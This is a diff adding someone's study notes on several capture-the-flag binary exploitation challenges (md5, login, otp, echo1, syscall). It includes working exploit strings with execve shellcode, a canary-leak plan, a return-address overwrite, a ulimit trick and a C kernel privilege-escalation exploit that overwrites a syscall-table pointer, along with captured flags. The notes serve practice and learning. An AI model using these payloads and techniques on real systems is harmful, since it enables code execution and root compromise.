@@ -960,3 +960,305 @@ Tips: When given a libc or NX is on, consider the approach in which you override
 $(python -c 'print "<" * 112 + "." + ",>" * 4 + ".\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n" + "\xfe\xef\xff\xbf"')
 
 Above is my code that would probably work is NX was disabled.
+
+
+
+-----------------------------------------
+md5 - Incomplete (come back later)
+
+Notes:   Look at custom methods first. Don't waste time going through standard methods like srand. (assembly)
+         Keep staring... Unless it's advertised as a hard challenge, the problem lies within those methods.
+
+
+ebp-0x38 stores the counter variable.
+ebp-0x34 + 4 * x stores the random number.
+
+ebp-0x34 = 3a331
+
+Steps:
+0x401 + 0x3a0d68 (store in ebp-0x30)
++
+0x6c486 - 0x1074
++
+0x3fc67 + 0x631bc9df
++
+0x51e7 - 0x19fa
+
+1 + 5  + 2 - 3 + 8 + 7 + 4 - 6 (no 0)
+Important to note: 8 IS THE STACK CANARY
+
+So you want to get the 
+
+edx xor'd w/ *stack cookie (= 0)
+0xbffff324: 0xbffff32c  0xd5fb8f21  0x3a331ca5  0x401a0810
+0xbffff334: 0x6c486787  0x107448ff  0x51e7dc99  0x3a0d6889
+0xbffff344: 0x19faf11f  0x631bc9df  0x3fc67400  0x598f9853
+0xbffff354: 0x00000000  0xbffff388  0x08049107  0x598f9853
+0xbffff364: 0x00000000  0x00000001  0x00000000  0xb7d8e3dc
+
+
+Up to +66, generates 7 random numbers and stores them.
+
+
+[-------------------------------------code-------------------------------------]
+   0x8048ed9 <my_hash+1>:  mov    ebp,esp
+   0x8048edb <my_hash+3>:  push   ebx
+   0x8048edc <my_hash+4>:  sub    esp,0x34
+=> 0x8048edf <my_hash+7>:  mov    eax,gs:0x14
+   0x8048ee5 <my_hash+13>: mov    DWORD PTR [ebp-0xc],eax
+   0x8048ee8 <my_hash+16>: xor    eax,eax
+   0x8048eea <my_hash+18>: lea    eax,[ebp-0x2c]
+   0x8048eed <my_hash+21>: mov    DWORD PTR [ebp-0x34],eax
+[------------------------------------stack-------------------------------------]
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xe3365400 
+EBX: 0x0 
+ECX: 0x4b22bf6d 
+EDX: 0xb7d8e3e4 --> 0xb7d8e070 --> 0x1d855307 
+ESI: 0x1 
+EDI: 0xb7d8e000 --> 0x1b2db0 
+EBP: 0xbffff358 --> 0xbffff388 --> 0x0 
+ESP: 0xbffff320 --> 0xb7d8ed60 --> 0xfbad2a84 
+EIP: 0x8048ee5 (<my_hash+13>: mov    DWORD PTR [ebp-0xc],eax)
+EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+
+This shows stack canary in this case is == 0xe3365400.
+
+*insert explanation about addition of variables here*
+
+0xbffff324: 0xbffff32c  0x96ab4254  0x470f7d35  0x3e8ad898
+0xbffff334: 0x7a9c0da3  0x6a38db9e  0x0582007d  0x7b13b7a7
+0xbffff344: 0x3b65607d  0x1f568c10  0xe3365400  0x598fb6e2
+0xbffff354: 0x00000000  0xbffff388  0x08049107  0x598fb6e2
+0xbffff364: 0x00000000  0x00000001  0x00000000  0xb7d8e3dc
+
+NOTICE stack canary is located at 0xbffff34c, or aka the position of 8 in the number addition.
+
+Therefore if I find the first 8 iterations of the rand, perform operations as the program would on them, and then subtract it from the random number given out so that I can get the stack canary! whoo!
+
+
+
+=> 0x0804929c <+0>:  push   ebp
+   0x0804929d <+1>:  mov    ebp,esp
+   0x0804929f <+3>:  sub    esp,0x28
+   0x080492a2 <+6>:  mov    eax,DWORD PTR [ebp+0x8]
+   0x080492a5 <+9>:  mov    DWORD PTR [esp+0x8],eax
+   0x080492a9 <+13>: mov    DWORD PTR [esp+0x4],0x811eb40
+   0x080492b1 <+21>: lea    eax,[ebp-0x14]
+   0x080492b4 <+24>: add    eax,0xc
+   0x080492b7 <+27>: mov    DWORD PTR [esp],eax
+   0x080492ba <+30>: call   0x8069660 <memcpy>
+   0x080492bf <+35>: mov    DWORD PTR [esp+0x4],0xc
+   0x080492c7 <+43>: lea    eax,[ebp-0x14]
+   0x080492ca <+46>: mov    DWORD PTR [esp],eax
+   0x080492cd <+49>: call   0x8049188 <calc_md5>
+   0x080492d2 <+54>: mov    DWORD PTR [ebp-0xc],eax
+   0x080492d5 <+57>: mov    eax,DWORD PTR [ebp-0xc]
+   0x080492d8 <+60>: mov    DWORD PTR [esp+0x4],eax
+   0x080492dc <+64>: mov    DWORD PTR [esp],0x80da677
+   0x080492e3 <+71>: call   0x805b630 <printf>
+   0x080492e8 <+76>: mov    eax,DWORD PTR [ebp-0xc]
+   0x080492eb <+79>: mov    DWORD PTR [esp+0x4],eax
+   0x080492ef <+83>: mov    DWORD PTR [esp],0x80da684
+   0x080492f6 <+90>: call   0x80482f0
+   0x080492fb <+95>: test   eax,eax
+   0x080492fd <+97>: jne    0x8049306 <auth+106>
+   0x080492ff <+99>: mov    eax,0x1
+   0x08049304 <+104>:   jmp    0x804930b <auth+111>
+   0x08049306 <+106>:   mov    eax,0x0
+   0x0804930b <+111>:   leave  
+   0x0804930c <+112>:   ret  
+
+
+-----------------------------------------
+login
+
+So, I actually made this challenge way harder than it was probably ever intended to be by completely forgetting about the fact that in the disassembly, there is a blatant Base64Decode method. I guess it never occured to me that despite all my attempts at putting in 0x41's, I never got could find any of the input...
+
+Well, once I figured that out, the program becomes significantly easier (and after I spent way too long looking through random assembly instructions the program went through). 
+
+Essentially, the program just comes down to these two instructions: 
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x80481d0 (<_init>:	push   ebx)
+ECX: 0x32 ('2')
+EDX: 0x80da684 ("f87cd601aa7fedca99018a8be88eda34")
+ESI: 0x0 
+EDI: 0x811b00c --> 0x80a6470 (<__stpcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
+EBP: 0x43434343 ('CCCC')
+ESP: 0xbffff350 --> 0xc ('\x0c')
+EIP: 0x8049424 (<main+279>:	leave)
+EFLAGS: 0x200297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049413 <main+262>:	mov    DWORD PTR [esp],0x80da6ba
+   0x804941a <main+269>:	call   0x805c2d0 <puts>
+   0x804941f <main+274>:	mov    eax,0x0
+=> 0x8049424 <main+279>:	leave  
+   0x8049425 <main+280>:	ret    
+
+What leave does is allow you to replace the value of esp with ebp. (mov esp, ebp -> pop ebp)
+However, this doesn't give control over EIP quite yet (which I actually want to change).
+The next instruction, though, ret allows $esp to transfer into eip. The one thing to note, however, is that during this process of moving an instruction along, the position of esp is incremented by 4. So I have to take that into account when choosing the location to jump to (just subtract it by 4).
+
+The most important thing is the ret command, which loads $esp into eip. Since the value of the function I want to jump to (0x08049278) is most likely just not written in the program, I take the easy way out and instead link it back to where the input is (0x0811eb40) where I will manually put the location of the method.
+
+>>> print "ABCD\x78\x92\x04\x08\x40\xeb\x11\x08".encode('base64')
+QUJDRHiSBAhA6xEI
+
+
+-----------------------------------------
+otp
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+
+int main(int argc, char* argv[]){
+	char fname[128];
+	unsigned long long otp[2];
+
+	if(argc!=2){
+		printf("usage : ./otp [passcode]\n");
+		return 0;
+	}
+
+	int fd = open("/dev/urandom", O_RDONLY);
+	if(fd==-1) exit(-1);
+
+	if(read(fd, otp, 16)!=16) exit(-1);
+	close(fd);
+
+	sprintf(fname, "/tmp/%llu", otp[0]);
+	FILE* fp = fopen(fname, "w");
+	if(fp==NULL){ exit(-1); }
+	fwrite(&otp[1], 8, 1, fp);
+	fclose(fp);
+
+	printf("OTP generated.\n");
+
+	unsigned long long passcode=0;
+	FILE* fp2 = fopen(fname, "r");
+	if(fp2==NULL){ exit(-1); }
+	fread(&passcode, 8, 1, fp2);
+	fclose(fp2);
+	
+	if(strtoul(argv[1], 0, 16) == passcode){
+		printf("Congratz!\n");
+		system("/bin/cat flag");
+	}
+	else{
+		printf("OTP mismatch\n");
+	}
+
+	unlink(fname);
+	return 0;
+}
+
+What I learned: the existence of ulimit. This gives file creation a set "limit", which when written, can effectively make the program create empty files. This allows me to essentially make an empty password.
+				Also look for unnecessary steps - in this case, the program had NO NEED TO MAKE A FILE.
+
+(Anyways, w/ the help of Google, the below was the solution):
+
+ulimit -f 0
+python /tmp/otp.py
+
+otp.py:
+import subprocess
+subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)
+
+
+--------------------------------------------------------------
+echo1
+
+Below is the solution:
+
+(python -c 'print "\xff\xe4" + "\n1\n" + "A" * 40 + "\xa0\x20\x60\x00\x00\x00\x00\x00" + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
+H4d_som3_fun_w1th_ech0_ov3rfl0w
+
+I didn't really learn too much, so I'll just write down what I should and shouldn't have done.
+
+My process approaching:
+1. Decompile w/ IDA
+2. CHECKSEC the program
+3. Analyze for bugs - don't get caught up in segfaults at weird inputs (look for big bugs that actually return)
+4. Try to look at weird code segments in IDA - chances are they're part of the exploit
+
+
+I first tried to generate a ROP chain, but then issues began cropping up as to how I was to call a function with /bin/sh. Before going further, Jack recommended I look at checksec (which showed that NX was disabled), and to run some shellcode. I initially attempted storing the shellcode in the username, but later dropped that approach in favor of one that replaced the username with "\xff\xe4", or jmp esp. The program can be made to ret to the username, so I could call stack from there (avoiding getting a leak). The stack, of course, I had already overriden with shellcode.
+
+
+--------------------------------------------------------------
+syscall
+
+[+] Flag: Congratz!! addr_limit looks quite IMPORTANT now... huh?
+
+greet.txt = "\x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70"
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+void main() {
+
+  int fd = open("greet.txt", O_RDONLY);
+  mmap (0 , 4096 , PROT_READ | PROT_WRITE | PROT_EXEC ,MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, fd , 0);
+  
+  
+  char memory[] = "\x00\x00\x00\x00";
+  char *pointer = (char *)0x8000e6c4; //sys_upper function ptr location
+  syscall(223, memory, pointer);
+  syscall(223);
+  
+  char flag[128];
+  FILE * fp = fopen("/root/flag","r");
+ 
+  fgets(flag, 128, fp);
+  printf("[+] Flag: %s", flag);
+
+  fclose(fp);
+}
+
+
+The above is the solution. But the question is how did I actually use it, and why.
+
+The literal linux terms were:
+echo -n -e \x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70" > greet.txt
+cat > test.c (then copy/paste c code)
+gcc test.c
+./a.out
+
+I'll explain the C code. So this challenge was kernel exploitation - this ultimately amounts to calling
+commit_creds(prepare_kernel_cred(0)) somewhere in the function. I tried deliberately putting the functions into the code, but I was unable to access the functions this way.
+
+So I decided to take another approach - more specifically, I would mmap out a section of memory with prepared shellcode, then using the exploitable syscall sys_upper (given in C code), I would edit the function pointer of syscall 223 (the syscall that handles sys_upper) to instead point to my shellcode instead of sys_upper.
+
+Writing Shellcode:
+So I decided to do cat /proc/kallsyms, which prints out the hardcoded memory locations of each system call. Running grep on it for commit_creds and prepare_kernel_cred returned the below:
+
+8003f924 T prepare_kernel_cred
+8003f56c T commit_creds
+
+The shellcode itself is pretty easy: below is it in x86:
+xor eax, eax
+call 0x8003f924
+call 0x8003f56c
+ret
+
+Unfortunately, I have to write it in ARM, not x86, so with the help of this website: http://armconverter.com/
+I was able to convert the below:
+EOR R0, R0, R0  - 0000EA80   ARM equivalent of xor eax, eax
+BL	#0x8003f924 - 49FE00EB   ARM equivalent of call 0x8003f924
+BL	#0x8003f56c - 5BFD00EB   ARM equivalent of call 0x8003f56c
+BX LR   		- 4770       ARM equivalent of ret
+
+into this: \x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70 (which you may notice is greet.txt).
+
+So now I have my shellcode, I dump it into a sample greet.txt file, which I then open and mmap to position 0x00000000 in memory. (I initially tried memcpy, but it kept segfaulting for some reason). I then calculate the syscall position of syscall 223 (since I'm given that syscall is located at 0x8000e348) as 0x8000e348 + 0x4 * 223 = 0x8000e6c4 (char * pointer in my code). I then overwrite that with 0x00000000 w/ the assistance of sys_upper. I then call sys_upper (which is now 0x00000000) again to call my shellcode, which puts me in ring 0. 
+
+Apparently calling system("/bin/sh") has permission issues at this point, so after messing around a bit, I just decided to read in the flag and print it from there.
